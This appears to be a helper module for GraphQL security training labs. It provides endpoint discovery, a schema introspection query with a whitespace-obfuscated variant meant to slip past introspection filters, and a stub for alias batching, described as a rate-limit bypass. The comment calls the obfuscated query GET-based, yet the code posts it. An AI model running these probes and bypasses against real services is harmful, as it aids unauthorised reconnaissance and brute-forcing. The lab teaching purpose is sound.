"""
utils.py — shared helpers for the GraphQL API Vulnerabilities module labs.

📝 Note: fully request-driven — GraphQL runs over plain HTTP POST (usually
JSON body to a single endpoint), so this is back to being as scriptable as
SQLi/SSRF with `requests`. The interesting parts are GraphQL-specific:
endpoint discovery, introspection, and alias-based batching.
"""

import json

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def graphql_query(session, endpoint, query, variables=None, operation_name=None):
    """POST a GraphQL query/mutation and return the parsed JSON response."""
    body = {"query": query}
    if variables is not None:
        body["variables"] = variables
    if operation_name is not None:
        body["operationName"] = operation_name
    r = session.post(endpoint, json=body)
    try:
        return r, r.json()
    except ValueError:
        return r, None


COMMON_GRAPHQL_PATHS = [
    "/graphql", "/graphql/v1", "/api", "/api/graphql", "/v1/graphql",
    "/v2/graphql", "/gql", "/graphql/api", "/graphql/graphql",
]


def discover_endpoint(session, base_url, probe_query='query{__typename}'):
    """
    Try common GraphQL endpoint paths with a harmless universal probe query
    (__typename is valid against any schema). A JSON response containing
    "data" (not a 404/HTML page) confirms a real GraphQL endpoint.
    """
    for path in COMMON_GRAPHQL_PATHS:
        url = f"{base_url}{path}"
        try:
            r, data = graphql_query(session, url, probe_query)
        except requests.RequestException:
            continue
        if data and ("data" in data or "errors" in data):
            log(f"GraphQL endpoint found: {path} (status {r.status_code})")
            return url
        log(f"{path} -> not GraphQL (status {r.status_code})", ok=False)
    return None


INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

# A GET-based, whitespace-obfuscated variant — useful when a naive
# introspection filter only pattern-matches the literal POST-body string
# "__schema" with standard formatting/whitespace.
INTROSPECTION_QUERY_OBFUSCATED = "query{__schema\n{queryType{name}}}"


def try_introspection(session, endpoint):
    """Attempt standard introspection, falling back to an obfuscated variant."""
    r, data = graphql_query(session, endpoint, INTROSPECTION_QUERY)
    if data and data.get("data", {}).get("__schema"):
        log("Introspection succeeded with standard query.")
        return data

    note("Standard introspection blocked — trying whitespace-obfuscated variant")
    note("(some filters only pattern-match a specific literal formatting).")
    r2, data2 = graphql_query(session, endpoint, INTROSPECTION_QUERY_OBFUSCATED)
    if data2 and data2.get("data", {}).get("__schema"):
        log("Introspection succeeded with obfuscated query.")
        return data2

    log("Introspection blocked by both attempts.", ok=False)
    return None


def build_aliased_batch(field_template, count, var_name_prefix="v"):
    """
    GraphQL aliases let you send MANY logically-separate queries/mutations
    in a SINGLE HTTP request (and often a single rate-limit "hit") — the
    standard brute-force-protection bypass. `field_template` should be a
    format string with {alias} and {value} placeholders for one attempt.
    """
    return field_template  # labs build the full batch inline for clarity
